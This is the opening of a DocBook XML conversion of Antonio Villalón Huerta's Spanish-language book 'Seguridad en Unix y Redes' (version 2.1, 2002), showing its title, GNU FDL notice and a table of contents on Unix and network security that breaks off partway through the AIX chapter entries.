<?xml version="1.0"?> 
<!DOCTYPE article [<!ENTITY \unskip \protect \relax \relax \kern .16667em %{} docbook.dtd PUBLIC 
"-//OASIS//DTD DocBook XML V4.2CR1//EN" 
"http://www.oasis-open.org/docbook/xml/4.2CR1/docbookx.dtd">  
\unskip \protect \relax \relax \kern .16667em %{}docbook.dtd;  
] > 
 
<!--translated from unixsec.tex, on 2004-07-24 00:36:00,  
by TeX4ht (http://www.cse.ohio-state.edu/~gurari/TeX4ht/) xhtml,docbook,refcaption --> 
 <article role="book">
<para role="maketitle">



<note role="title"><para>SEGURIDAD EN UNIX Y REDES
Versi&#x00F3;n 2.1</para></note>
<note role="author"><para><personname><othername>Antonio Villal&#x00F3;n Huerta</othername></personname></para></note>
<note role="date"><para>Julio, 2002</para></note>

  </para>


<!--l. 32--><para>

</para><section role="center"><title/>
<!--l. 34--><para>
 Copyright &#x00A9;&#x00A0;2000,2002 Antonio Villal&#x00F3;n Huerta.
 <!--br/-->Permission  is  granted  to  copy,  distribute  and/or  modify  this
 document  under  the  terms  of  the  GNU  Free  Documentation
 License, Version 1.1 or any later version published by the Free
 Software Foundation; with the Invariant Sections being &#x2018;Notas del
 Autor&#x2019; and &#x2018;Conclusiones&#x2019;, with no Front-Cover Texts, and with no
 Back-Cover Texts. A copy of the license is included in the section
 entitled &#x2018;GNU Free Documentation License&#x2019;.    </para></section>

<!--l. 46--><para>


</para><!--l. 48--><para>

  </para><!--l. 48--><section 
role="likechapter"><title><anchor 
   id="x1-1000"  ></anchor>&#x00CD;ndice general</title>
  <toc><tocpart> 
<tocentry role="chapterToc">0&#x00A0;<anchor 
   id="QQ2-1-4"  ></anchor><ulink 
  url="#x1-40000"  ></ulink>Notas del autor</tocentry> 
<tocentry role="chapterToc">1&#x00A0;<anchor 
   id="QQ2-1-5"  ></anchor><ulink 
  url="#x1-50001"  ></ulink>Introducci&#x00F3;n y conceptos previos</tocentry> 
<tocentry role="sectionToc">1.1&#x00A0;<anchor 
   id="QQ2-1-6"  ></anchor><ulink 
  url="#x1-60001.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">1.2&#x00A0;<anchor 
   id="QQ2-1-7"  ></anchor><ulink 
  url="#x1-70001.2"  ></ulink>Justi&#xFB01;caci&#x00F3;n
y objetivos</tocentry> 
<tocentry role="sectionToc">1.3&#x00A0;<anchor 
   id="QQ2-1-8"  ></anchor><ulink 
  url="#x1-80001.3"  ></ulink>&#x00BF;Qu&#x00E9; es seguridad?</tocentry> 
<tocentry role="sectionToc">1.4&#x00A0;<anchor 
   id="QQ2-1-9"  ></anchor><ulink 
  url="#x1-90001.4"  ></ulink>&#x00BF;Qu&#x00E9; queremos proteger?</tocentry> 
<tocentry role="sectionToc">1.5&#x00A0;<anchor 
   id="QQ2-1-11"  ></anchor><ulink 
  url="#x1-100001.5"  ></ulink>&#x00BF;De qu&#x00E9; nos queremos
proteger?</tocentry> 
<tocentry role="subsectionToc">1.5.1&#x00A0;<anchor 
   id="QQ2-1-12"  ></anchor><ulink 
  url="#x1-110001.5.1"  ></ulink>Personas</tocentry> 
<tocentry role="subsectionToc">1.5.2&#x00A0;<anchor 
   id="QQ2-1-13"  ></anchor><ulink 
  url="#x1-120001.5.2"  ></ulink>Amenazas l&#x00F3;gicas</tocentry> 
<tocentry role="subsectionToc">1.5.3&#x00A0;<anchor 
   id="QQ2-1-14"  ></anchor><ulink 
  url="#x1-130001.5.3"  ></ulink>Cat&#x00E1;strofes</tocentry> 
<tocentry role="sectionToc">1.6&#x00A0;<anchor 
   id="QQ2-1-15"  ></anchor><ulink 
  url="#x1-140001.6"  ></ulink>&#x00BF;C&#x00F3;mo nos podemos
proteger?</tocentry> 
<tocentry role="sectionToc">1.7&#x00A0;<anchor 
   id="QQ2-1-17"  ></anchor><ulink 
  url="#x1-150001.7"  ></ulink>Redes &#x2018;normales&#x2019;</tocentry> 
<tocentry role="subsectionToc">1.7.1&#x00A0;<anchor 
   id="QQ2-1-18"  ></anchor><ulink 
  url="#x1-160001.7.1"  ></ulink>Redes de I+D</tocentry> 
<tocentry role="subsectionToc">1.7.2&#x00A0;<anchor 
   id="QQ2-1-19"  ></anchor><ulink 
  url="#x1-170001.7.2"  ></ulink>Empresas</tocentry> 
<tocentry role="subsectionToc">1.7.3&#x00A0;<anchor 
   id="QQ2-1-20"  ></anchor><ulink 
  url="#x1-180001.7.3"  ></ulink>ISPs</tocentry> 
<tocentry role="sectionToc">1.8&#x00A0;<anchor 
   id="QQ2-1-21"  ></anchor><ulink 
  url="#x1-190001.8"  ></ulink>&#x00BF;Seguridad
en Unix?</tocentry> 
<tocentry role="partToc">I&#x00A0;<anchor 
   id="QQ2-1-22"  ></anchor><ulink 
  url="#x1-20000I"  ></ulink>Seguridad del entorno de operaciones</tocentry> 
<tocentry role="chapterToc">2&#x00A0;<anchor 
   id="QQ2-1-23"  ></anchor><ulink 
  url="#x1-210002"  ></ulink>Seguridad f&#x02CA;&#x0131;sica de los
sistemas</tocentry> 
<tocentry role="sectionToc">2.1&#x00A0;<anchor 
   id="QQ2-1-24"  ></anchor><ulink 
  url="#x1-220002.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">2.2&#x00A0;<anchor 
   id="QQ2-1-25"  ></anchor><ulink 
  url="#x1-230002.2"  ></ulink>Protecci&#x00F3;n del hardware</tocentry> 
<tocentry role="subsectionToc">2.2.1&#x00A0;<anchor 
   id="QQ2-1-26"  ></anchor><ulink 
  url="#x1-240002.2.1"  ></ulink>Acceso f&#x02CA;&#x0131;sico</tocentry> 
<tocentry role="subsectionToc">2.2.2&#x00A0;<anchor 
   id="QQ2-1-29"  ></anchor><ulink 
  url="#x1-270002.2.2"  ></ulink>Desastres
naturales</tocentry> 
<tocentry role="subsectionToc">2.2.3&#x00A0;<anchor 
   id="QQ2-1-33"  ></anchor><ulink 
  url="#x1-310002.2.3"  ></ulink>Desastres del entorno</tocentry> 
<tocentry role="sectionToc">2.3&#x00A0;<anchor 
   id="QQ2-1-38"  ></anchor><ulink 
  url="#x1-360002.3"  ></ulink>Protecci&#x00F3;n de los datos</tocentry> 
<tocentry role="subsectionToc">2.3.1&#x00A0;<anchor 
   id="QQ2-1-39"  ></anchor><ulink 
  url="#x1-370002.3.1"  ></ulink>Eavesdropping</tocentry> 
<tocentry role="subsectionToc">2.3.2&#x00A0;<anchor 
   id="QQ2-1-40"  ></anchor><ulink 
  url="#x1-380002.3.2"  ></ulink>Backups</tocentry> 
<tocentry role="subsectionToc">2.3.3&#x00A0;<anchor 
   id="QQ2-1-41"  ></anchor><ulink 
  url="#x1-390002.3.3"  ></ulink>Otros
elementos</tocentry> 
<tocentry role="sectionToc">2.4&#x00A0;<anchor 
   id="QQ2-1-42"  ></anchor><ulink 
  url="#x1-400002.4"  ></ulink>Radiaciones electromagn&#x00E9;ticas</tocentry> 
<tocentry role="chapterToc">3&#x00A0;<anchor 
   id="QQ2-1-43"  ></anchor><ulink 
  url="#x1-410003"  ></ulink>Administradores, usuarios y
personal</tocentry> 
<tocentry role="sectionToc">3.1&#x00A0;<anchor 
   id="QQ2-1-44"  ></anchor><ulink 
  url="#x1-420003.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">3.2&#x00A0;<anchor 
   id="QQ2-1-45"  ></anchor><ulink 
  url="#x1-430003.2"  ></ulink>Ataques potenciales</tocentry> 
<tocentry role="subsectionToc">3.2.1&#x00A0;<anchor 
   id="QQ2-1-46"  ></anchor><ulink 
  url="#x1-440003.2.1"  ></ulink>Ingenier&#x02CA;&#x0131;a social</tocentry> 
<tocentry role="subsectionToc">3.2.2&#x00A0;<anchor 
   id="QQ2-1-47"  ></anchor><ulink 
  url="#x1-450003.2.2"  ></ulink>Shoulder
Sur&#xFB01;ng</tocentry> 
<tocentry role="subsectionToc">3.2.3&#x00A0;<anchor 
   id="QQ2-1-48"  ></anchor><ulink 
  url="#x1-460003.2.3"  ></ulink>Masquerading</tocentry> 
<tocentry role="subsectionToc">3.2.4&#x00A0;<anchor 
   id="QQ2-1-49"  ></anchor><ulink 
  url="#x1-470003.2.4"  ></ulink>Basureo</tocentry> 
<tocentry role="subsectionToc">3.2.5&#x00A0;<anchor 
   id="QQ2-1-51"  ></anchor><ulink 
  url="#x1-480003.2.5"  ></ulink>Actos delictivos</tocentry> 
<tocentry role="sectionToc">3.3&#x00A0;<anchor 
   id="QQ2-1-52"  ></anchor><ulink 
  url="#x1-490003.3"  ></ulink>&#x00BF;Qu&#x00E9; hacer ante
estos problemas?</tocentry> 
<tocentry role="sectionToc">3.4&#x00A0;<anchor 
   id="QQ2-1-53"  ></anchor><ulink 
  url="#x1-500003.4"  ></ulink>El atacante interno</tocentry> 
<tocentry role="partToc">II&#x00A0;<anchor 
   id="QQ2-1-54"  ></anchor><ulink 
  url="#x1-51000II"  ></ulink>Seguridad del sistema</tocentry> 
<tocentry role="chapterToc">4&#x00A0;<anchor 
   id="QQ2-1-55"  ></anchor><ulink 
  url="#x1-520004"  ></ulink>El sistema de
&#xFB01;cheros</tocentry> 
<tocentry role="sectionToc">4.1&#x00A0;<anchor 
   id="QQ2-1-56"  ></anchor><ulink 
  url="#x1-530004.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">4.2&#x00A0;<anchor 
   id="QQ2-1-57"  ></anchor><ulink 
  url="#x1-540004.2"  ></ulink>Sistemas de &#xFB01;cheros</tocentry> 
<tocentry role="sectionToc">4.3&#x00A0;<anchor 
   id="QQ2-1-58"  ></anchor><ulink 
  url="#x1-550004.3"  ></ulink>Permisos de un archivo</tocentry> 
<tocentry role="sectionToc">4.4&#x00A0;<anchor 
   id="QQ2-1-60"  ></anchor><ulink 
  url="#x1-560004.4"  ></ulink>Los
bits SUID, SGID y sticky</tocentry> 
<tocentry role="sectionToc">4.5&#x00A0;<anchor 
   id="QQ2-1-61"  ></anchor><ulink 
  url="#x1-570004.5"  ></ulink>Atributos de un archivo</tocentry> 
<tocentry role="sectionToc">4.6&#x00A0;<anchor 
   id="QQ2-1-63"  ></anchor><ulink 
  url="#x1-580004.6"  ></ulink>Listas de control de
acceso: ACLs</tocentry> 
<tocentry role="sectionToc">4.7&#x00A0;<anchor 
   id="QQ2-1-64"  ></anchor><ulink 
  url="#x1-590004.7"  ></ulink>Recuperaci&#x00F3;n de datos</tocentry> 
<tocentry role="sectionToc">4.8&#x00A0;<anchor 
   id="QQ2-1-65"  ></anchor><ulink 
  url="#x1-600004.8"  ></ulink>Almacenamiento seguro</tocentry> 
<tocentry role="subsectionToc">4.8.1&#x00A0;<anchor 
   id="QQ2-1-66"  ></anchor><ulink 
  url="#x1-610004.8.1"  ></ulink>La orden
crypt(1)</tocentry> 
<tocentry role="subsectionToc">4.8.2&#x00A0;<anchor 
   id="QQ2-1-67"  ></anchor><ulink 
  url="#x1-620004.8.2"  ></ulink>PGP: Pretty Good Privacy</tocentry> 
<tocentry role="subsectionToc">4.8.3&#x00A0;<anchor 
   id="QQ2-1-68"  ></anchor><ulink 
  url="#x1-630004.8.3"  ></ulink>TCFS: Transparent Cryptographic
File System</tocentry> 
<tocentry role="subsectionToc">4.8.4&#x00A0;<anchor 
   id="QQ2-1-69"  ></anchor><ulink 
  url="#x1-640004.8.4"  ></ulink>Otros m&#x00E9;todos de almacenamiento seguro</tocentry> 
<tocentry role="chapterToc">5&#x00A0;<anchor 
   id="QQ2-1-70"  ></anchor><ulink 
  url="#x1-650005"  ></ulink>Programas seguros,
inseguros y nocivos</tocentry> 
<tocentry role="sectionToc">5.1&#x00A0;<anchor 
   id="QQ2-1-71"  ></anchor><ulink 
  url="#x1-660005.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">5.2&#x00A0;<anchor 
   id="QQ2-1-72"  ></anchor><ulink 
  url="#x1-670005.2"  ></ulink>La base &#xFB01;able de c&#x00F3;mputo</tocentry> 
<tocentry role="sectionToc">5.3&#x00A0;<anchor 
   id="QQ2-1-73"  ></anchor><ulink 
  url="#x1-680005.3"  ></ulink>Errores en
los programas</tocentry> 
<tocentry role="subsectionToc">5.3.1&#x00A0;<anchor 
   id="QQ2-1-74"  ></anchor><ulink 
  url="#x1-690005.3.1"  ></ulink>Bu&#xFB00;er over&#xFB02;ows</tocentry> 
<tocentry role="subsectionToc">5.3.2&#x00A0;<anchor 
   id="QQ2-1-75"  ></anchor><ulink 
  url="#x1-700005.3.2"  ></ulink>Condiciones de carrera</tocentry> 
<tocentry role="sectionToc">5.4&#x00A0;<anchor 
   id="QQ2-1-76"  ></anchor><ulink 
  url="#x1-710005.4"  ></ulink>Fauna
y otras amenazas</tocentry> 
<tocentry role="subsectionToc">5.4.1&#x00A0;<anchor 
   id="QQ2-1-77"  ></anchor><ulink 
  url="#x1-720005.4.1"  ></ulink>Virus</tocentry> 
<tocentry role="subsectionToc">5.4.2&#x00A0;<anchor 
   id="QQ2-1-78"  ></anchor><ulink 
  url="#x1-730005.4.2"  ></ulink>Gusanos</tocentry> 
<tocentry role="subsectionToc">5.4.3&#x00A0;<anchor 
   id="QQ2-1-79"  ></anchor><ulink 
  url="#x1-740005.4.3"  ></ulink>Conejos</tocentry> 
<tocentry role="subsectionToc">5.4.4&#x00A0;<anchor 
   id="QQ2-1-80"  ></anchor><ulink 
  url="#x1-750005.4.4"  ></ulink>Caballos de
Troya</tocentry> 
<tocentry role="subsectionToc">5.4.5&#x00A0;<anchor 
   id="QQ2-1-81"  ></anchor><ulink 
  url="#x1-760005.4.5"  ></ulink>Applets hostiles</tocentry> 
<tocentry role="subsectionToc">5.4.6&#x00A0;<anchor 
   id="QQ2-1-82"  ></anchor><ulink 
  url="#x1-770005.4.6"  ></ulink>Bombas l&#x00F3;gicas</tocentry> 
<tocentry role="subsectionToc">5.4.7&#x00A0;<anchor 
   id="QQ2-1-83"  ></anchor><ulink 
  url="#x1-780005.4.7"  ></ulink>Canales ocultos</tocentry> 
<tocentry role="subsectionToc">5.4.8&#x00A0;<anchor 
   id="QQ2-1-84"  ></anchor><ulink 
  url="#x1-790005.4.8"  ></ulink>Puertas
traseras</tocentry> 
<tocentry role="subsectionToc">5.4.9&#x00A0;<anchor 
   id="QQ2-1-85"  ></anchor><ulink 
  url="#x1-800005.4.9"  ></ulink>Superzapping</tocentry> 
<tocentry role="subsectionToc">5.4.10&#x00A0;<anchor 
   id="QQ2-1-86"  ></anchor><ulink 
  url="#x1-810005.4.10"  ></ulink>Programas salami</tocentry> 
<tocentry role="sectionToc">5.5&#x00A0;<anchor 
   id="QQ2-1-87"  ></anchor><ulink 
  url="#x1-820005.5"  ></ulink>Programaci&#x00F3;n segura</tocentry> 
<tocentry role="chapterToc">6&#x00A0;<anchor 
   id="QQ2-1-88"  ></anchor><ulink 
  url="#x1-830006"  ></ulink>Auditor&#x02CA;&#x0131;a
del sistema</tocentry> 
<tocentry role="sectionToc">6.1&#x00A0;<anchor 
   id="QQ2-1-89"  ></anchor><ulink 
  url="#x1-840006.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">6.2&#x00A0;<anchor 
   id="QQ2-1-90"  ></anchor><ulink 
  url="#x1-850006.2"  ></ulink>El sistema de log en Unix</tocentry> 
<tocentry role="sectionToc">6.3&#x00A0;<anchor 
   id="QQ2-1-91"  ></anchor><ulink 
  url="#x1-860006.3"  ></ulink>El demonio
syslogd</tocentry> 
<tocentry role="sectionToc">6.4&#x00A0;<anchor 
   id="QQ2-1-92"  ></anchor><ulink 
  url="#x1-870006.4"  ></ulink>Algunos archivos de log</tocentry> 
<tocentry role="subsectionToc">6.4.1&#x00A0;<anchor 
   id="QQ2-1-93"  ></anchor><ulink 
  url="#x1-880006.4.1"  ></ulink>syslog</tocentry> 
<tocentry role="subsectionToc">6.4.2&#x00A0;<anchor 
   id="QQ2-1-94"  ></anchor><ulink 
  url="#x1-890006.4.2"  ></ulink>messages</tocentry> 
<tocentry role="subsectionToc">6.4.3&#x00A0;<anchor 
   id="QQ2-1-95"  ></anchor><ulink 
  url="#x1-900006.4.3"  ></ulink>wtmp</tocentry> 
<tocentry role="subsectionToc">6.4.4&#x00A0;<anchor 
   id="QQ2-1-96"  ></anchor><ulink 
  url="#x1-910006.4.4"  ></ulink>utmp</tocentry> 
<tocentry role="subsectionToc">6.4.5&#x00A0;<anchor 
   id="QQ2-1-97"  ></anchor><ulink 
  url="#x1-920006.4.5"  ></ulink>lastlog</tocentry> 
<tocentry role="subsectionToc">6.4.6&#x00A0;<anchor 
   id="QQ2-1-98"  ></anchor><ulink 
  url="#x1-930006.4.6"  ></ulink>faillog</tocentry> 
<tocentry role="subsectionToc">6.4.7&#x00A0;<anchor 
   id="QQ2-1-99"  ></anchor><ulink 
  url="#x1-940006.4.7"  ></ulink>loginlog</tocentry> 
<tocentry role="subsectionToc">6.4.8&#x00A0;<anchor 
   id="QQ2-1-100"  ></anchor><ulink 
  url="#x1-950006.4.8"  ></ulink>btmp</tocentry> 
<tocentry role="subsectionToc">6.4.9&#x00A0;<anchor 
   id="QQ2-1-101"  ></anchor><ulink 
  url="#x1-960006.4.9"  ></ulink>sulog</tocentry> 
<tocentry role="subsectionToc">6.4.10&#x00A0;<anchor 
   id="QQ2-1-102"  ></anchor><ulink 
  url="#x1-970006.4.10"  ></ulink>debug</tocentry> 
<tocentry role="sectionToc">6.5&#x00A0;<anchor 
   id="QQ2-1-103"  ></anchor><ulink 
  url="#x1-980006.5"  ></ulink>Logs
remotos</tocentry> 
<tocentry role="sectionToc">6.6&#x00A0;<anchor 
   id="QQ2-1-104"  ></anchor><ulink 
  url="#x1-990006.6"  ></ulink>Registros f&#x02CA;&#x0131;sicos</tocentry> 
<tocentry role="chapterToc">7&#x00A0;<anchor 
   id="QQ2-1-105"  ></anchor><ulink 
  url="#x1-1000007"  ></ulink>Copias de seguridad</tocentry> 
<tocentry role="sectionToc">7.1&#x00A0;<anchor 
   id="QQ2-1-106"  ></anchor><ulink 
  url="#x1-1010007.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">7.2&#x00A0;<anchor 
   id="QQ2-1-107"  ></anchor><ulink 
  url="#x1-1020007.2"  ></ulink>Dispositivos de
almacenamiento</tocentry> 
<tocentry role="sectionToc">7.3&#x00A0;<anchor 
   id="QQ2-1-109"  ></anchor><ulink 
  url="#x1-1030007.3"  ></ulink>Algunas &#x00F3;rdenes para realizar copias de seguridad</tocentry> 
<tocentry role="subsectionToc">7.3.1&#x00A0;<anchor 
   id="QQ2-1-110"  ></anchor><ulink 
  url="#x1-1040007.3.1"  ></ulink>dump/restore</tocentry> 
<tocentry role="subsectionToc">7.3.2&#x00A0;<anchor 
   id="QQ2-1-113"  ></anchor><ulink 
  url="#x1-1050007.3.2"  ></ulink>La
orden tar</tocentry> 
<tocentry role="subsectionToc">7.3.3&#x00A0;<anchor 
   id="QQ2-1-115"  ></anchor><ulink 
  url="#x1-1060007.3.3"  ></ulink>La orden cpio</tocentry> 
<tocentry role="subsectionToc">7.3.4&#x00A0;<anchor 
   id="QQ2-1-117"  ></anchor><ulink 
  url="#x1-1070007.3.4"  ></ulink>Backups sobre CD-ROM</tocentry> 
<tocentry role="sectionToc">7.4&#x00A0;<anchor 
   id="QQ2-1-118"  ></anchor><ulink 
  url="#x1-1080007.4"  ></ulink>Pol&#x02CA;&#x0131;ticas de copias de
seguridad</tocentry> 
<tocentry role="chapterToc">8&#x00A0;<anchor 
   id="QQ2-1-119"  ></anchor><ulink 
  url="#x1-1090008"  ></ulink>Autenticaci&#x00F3;n de usuarios</tocentry> 
<tocentry role="sectionToc">8.1&#x00A0;<anchor 
   id="QQ2-1-120"  ></anchor><ulink 
  url="#x1-1100008.1"  ></ulink>Introducci&#x00F3;n y conceptos b&#x00E1;sicos</tocentry> 
<tocentry role="sectionToc">8.2&#x00A0;<anchor 
   id="QQ2-1-121"  ></anchor><ulink 
  url="#x1-1110008.2"  ></ulink>Sistemas
basados en algo conocido: contrase~nas</tocentry> 
<tocentry role="sectionToc">8.3&#x00A0;<anchor 
   id="QQ2-1-122"  ></anchor><ulink 
  url="#x1-1120008.3"  ></ulink>Sistemas basados en algo pose&#x02CA;&#x0131;do:
tarjetas inteligentes</tocentry> 
<tocentry role="sectionToc">8.4&#x00A0;<anchor 
   id="QQ2-1-124"  ></anchor><ulink 
  url="#x1-1130008.4"  ></ulink>Sistemas de autenticaci&#x00F3;n biom&#x00E9;trica</tocentry> 
<tocentry role="subsectionToc">8.4.1&#x00A0;<anchor 
   id="QQ2-1-126"  ></anchor><ulink 
  url="#x1-1140008.4.1"  ></ulink>Veri&#xFB01;caci&#x00F3;n de
voz</tocentry> 
<tocentry role="subsectionToc">8.4.2&#x00A0;<anchor 
   id="QQ2-1-127"  ></anchor><ulink 
  url="#x1-1150008.4.2"  ></ulink>Veri&#xFB01;caci&#x00F3;n de escritura</tocentry> 
<tocentry role="subsectionToc">8.4.3&#x00A0;<anchor 
   id="QQ2-1-128"  ></anchor><ulink 
  url="#x1-1160008.4.3"  ></ulink>Veri&#xFB01;caci&#x00F3;n de huellas</tocentry> 
<tocentry role="subsectionToc">8.4.4&#x00A0;<anchor 
   id="QQ2-1-130"  ></anchor><ulink 
  url="#x1-1170008.4.4"  ></ulink>Veri&#xFB01;caci&#x00F3;n de patrones
oculares</tocentry> 
<tocentry role="subsectionToc">8.4.5&#x00A0;<anchor 
   id="QQ2-1-134"  ></anchor><ulink 
  url="#x1-1200008.4.5"  ></ulink>Veri&#xFB01;caci&#x00F3;n de la geometr&#x02CA;&#x0131;a de la mano</tocentry> 
<tocentry role="sectionToc">8.5&#x00A0;<anchor 
   id="QQ2-1-136"  ></anchor><ulink 
  url="#x1-1210008.5"  ></ulink>Autenticaci&#x00F3;n de usuarios
en Unix</tocentry> 
<tocentry role="subsectionToc">8.5.1&#x00A0;<anchor 
   id="QQ2-1-137"  ></anchor><ulink 
  url="#x1-1220008.5.1"  ></ulink>Autenticaci&#x00F3;n cl&#x00E1;sica</tocentry> 
<tocentry role="subsectionToc">8.5.2&#x00A0;<anchor 
   id="QQ2-1-138"  ></anchor><ulink 
  url="#x1-1230008.5.2"  ></ulink>Mejora de la seguridad</tocentry> 
<tocentry role="sectionToc">8.6&#x00A0;<anchor 
   id="QQ2-1-147"  ></anchor><ulink 
  url="#x1-1300008.6"  ></ulink>PAM</tocentry> 
<tocentry role="partToc">III&#x00A0;<anchor 
   id="QQ2-1-148"  ></anchor><ulink 
  url="#x1-131000III"  ></ulink>Algunos
sistemas Unix</tocentry> 
<tocentry role="chapterToc">9&#x00A0;<anchor 
   id="QQ2-1-149"  ></anchor><ulink 
  url="#x1-1320009"  ></ulink>Solaris</tocentry> 
<tocentry role="sectionToc">9.1&#x00A0;<anchor 
   id="QQ2-1-150"  ></anchor><ulink 
  url="#x1-1330009.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">9.2&#x00A0;<anchor 
   id="QQ2-1-151"  ></anchor><ulink 
  url="#x1-1340009.2"  ></ulink>Seguridad f&#x02CA;&#x0131;sica en SPARC</tocentry> 
<tocentry role="sectionToc">9.3&#x00A0;<anchor 
   id="QQ2-1-152"  ></anchor><ulink 
  url="#x1-1350009.3"  ></ulink>Servicios
de red</tocentry> 
<tocentry role="sectionToc">9.4&#x00A0;<anchor 
   id="QQ2-1-153"  ></anchor><ulink 
  url="#x1-1360009.4"  ></ulink>Usuarios y accesos al sistema</tocentry> 
<tocentry role="sectionToc">9.5&#x00A0;<anchor 
   id="QQ2-1-154"  ></anchor><ulink 
  url="#x1-1370009.5"  ></ulink>El sistema de parcheado</tocentry> 
<tocentry role="sectionToc">9.6&#x00A0;<anchor 
   id="QQ2-1-155"  ></anchor><ulink 
  url="#x1-1380009.6"  ></ulink>Extensiones
de la seguridad</tocentry> 
<tocentry role="subsectionToc">9.6.1&#x00A0;<anchor 
   id="QQ2-1-156"  ></anchor><ulink 
  url="#x1-1390009.6.1"  ></ulink>ASET</tocentry> 
<tocentry role="subsectionToc">9.6.2&#x00A0;<anchor 
   id="QQ2-1-157"  ></anchor><ulink 
  url="#x1-1400009.6.2"  ></ulink>JASS</tocentry> 
<tocentry role="subsectionToc">9.6.3&#x00A0;<anchor 
   id="QQ2-1-158"  ></anchor><ulink 
  url="#x1-1410009.6.3"  ></ulink>SFPDB</tocentry> 
<tocentry role="sectionToc">9.7&#x00A0;<anchor 
   id="QQ2-1-159"  ></anchor><ulink 
  url="#x1-1420009.7"  ></ulink>EL SUBSISTEMA DE
RED</tocentry> 
<tocentry role="sectionToc">9.8&#x00A0;<anchor 
   id="QQ2-1-160"  ></anchor><ulink 
  url="#x1-1430009.8"  ></ulink>PAR&#x00E1;METROS DEL N&#x00FA;CLEO</tocentry> 
<tocentry role="chapterToc">10&#x00A0;<anchor 
   id="QQ2-1-161"  ></anchor><ulink 
  url="#x1-14400010"  ></ulink>LINUX</tocentry> 
<tocentry role="sectionToc">10.1&#x00A0;<anchor 
   id="QQ2-1-162"  ></anchor><ulink 
  url="#x1-14500010.1"  ></ulink>INTRODUCCI&#x00F3;N</tocentry> 
<tocentry role="sectionToc">10.2&#x00A0;<anchor 
   id="QQ2-1-163"  ></anchor><ulink 
  url="#x1-14600010.2"  ></ulink>SEGURIDAD
F&#x02CA;ISICA EN X86</tocentry> 
<tocentry role="sectionToc">10.3&#x00A0;<anchor 
   id="QQ2-1-164"  ></anchor><ulink 
  url="#x1-14700010.3"  ></ulink>USUARIOS Y ACCESOS AL SISTEMA</tocentry> 
<tocentry role="sectionToc">10.4&#x00A0;<anchor 
   id="QQ2-1-165"  ></anchor><ulink 
  url="#x1-14800010.4"  ></ulink>EL SISTEMA DE
PARCHEADO</tocentry> 
<tocentry role="sectionToc">10.5&#x00A0;<anchor 
   id="QQ2-1-166"  ></anchor><ulink 
  url="#x1-14900010.5"  ></ulink>EL SUBSISTEMA DE RED</tocentry> 
<tocentry role="sectionToc">10.6&#x00A0;<anchor 
   id="QQ2-1-167"  ></anchor><ulink 
  url="#x1-15000010.6"  ></ulink>EL N&#x00FA;CLEO DE LINUX</tocentry> 
<tocentry role="subsectionToc">10.6.1&#x00A0;<anchor 
   id="QQ2-1-168"  ></anchor><ulink 
  url="#x1-15100010.6.1"  ></ulink>OPCIONES
DE COMPILACI&#x00F3;N</tocentry> 
<tocentry role="subsectionToc">10.6.2&#x00A0;<anchor 
   id="QQ2-1-169"  ></anchor><ulink 
  url="#x1-15200010.6.2"  ></ulink>DISPOSITIVOS</tocentry> 
<tocentry role="subsectionToc">10.6.3&#x00A0;<anchor 
   id="QQ2-1-170"  ></anchor><ulink 
  url="#x1-15300010.6.3"  ></ulink>ALGUNAS MEJORAS DE LA
SEGURIDAD</tocentry> 
<tocentry role="chapterToc">11&#x00A0;<anchor 
   id="QQ2-1-175"  ></anchor><ulink 
  url="#x1-15800011"  ></ulink>AIX</tocentry> 
<tocentry role="sectionToc">11.1&#x00A0;<anchor 
   id="QQ2-1-176"  ></anchor><ulink 
  url="#x1-15900011.1"  ></ulink>INTRODUCCI&#x00F3;N</tocentry> 
<tocentry role="sectionToc">11.2&#x00A0;<anchor 
   id="QQ2-1-177"  ></anchor><ulink 
  url="#x1-16000011.2"  ></ulink>SEGURIDAD F&#x02CA;ISICA EN RS/6000</tocentry> 
<tocentry role="sectionToc">11.3&#x00A0;<anchor 
   id="QQ2-1-178"  ></anchor><ulink 
  url="#x1-16100011.3"  ></ulink>SERVICIOS
DE RED</tocentry> 
<tocentry role="sectionToc">11.4&#x00A0;<anchor 
   id="QQ2-1-180"  ></anchor><ulink 
  url="#x1-16200011.4"  ></ulink>USUARIOS Y ACCESOS AL SISTEMA</tocentry> 
<tocentry role="subsectionToc">11.4.1&#x00A0;<anchor 
   id="QQ2-1-181"  ></anchor><ulink 
  url="#x1-16300011.4.1"  ></ulink>EL FICHERO /etc/security/.ids</tocentry> 
<tocentry role="subsectionToc">11.4.2&#x00A0;<anchor 
   id="QQ2-1-182"  ></anchor><ulink 
  url="#x1-16400011.4.2"  ></ulink>EL
FICHERO /etc/security/passwd</tocentry> 
<tocentry role="subsectionToc">11.4.3&#x00A0;<anchor 
   id="QQ2-1-183"  ></anchor><ulink 
  url="#x1-16500011.4.3"  ></ulink>EL FICHERO /etc/security/failedlogin</tocentry> 
<tocentry role="subsectionToc">11.4.4&#x00A0;<anchor 
   id="QQ2-1-184"  ></anchor><ulink 
  url="#x1-16600011.4.4"  ></ulink>EL
FICHERO /etc/security/lastlog</tocentry> 
<tocentry role="subsectionToc">11.4.5&#x00A0;<anchor 
   id="QQ2-1-185"  ></anchor><ulink 
  url="#x1-16700011.4.5"  ></ulink>EL FICHERO /etc/security/limits</tocentry> 
<tocentry role="subsectionToc">11.4.6&#x00A0;<anchor 
   id="QQ2-1-186"  ></anchor><ulink 
  url="#x1-16800011.4.6"  ></ulink>EL
FICHERO /etc/security/login.cfg</tocentry> 
<tocentry role="subsectionToc">11.4.7&#x00A0;<anchor 
   id="QQ2-1-187"  ></anchor><ulink 
  url="#x1-16900011.4.7"  ></ulink>EL FICHERO /etc/security/user</tocentry> 
<tocentry role="subsectionToc">11.4.8&#x00A0;<anchor 
   id="QQ2-1-188"  ></anchor><ulink 
  url="#x1-17000011.4.8"  ></ulink>EL
FICHERO /etc/security/group</tocentry> 
<tocentry role="sectionToc">11.5&#x00A0;<anchor 
   id="QQ2-1-189"  ></anchor><ulink 
  url="#x1-17100011.5"  ></ulink>EL SISTEMA DE log</tocentry> 
<tocentry role="sectionToc">11.6&#x00A0;<anchor 
   id="QQ2-1-190"  ></anchor><ulink 
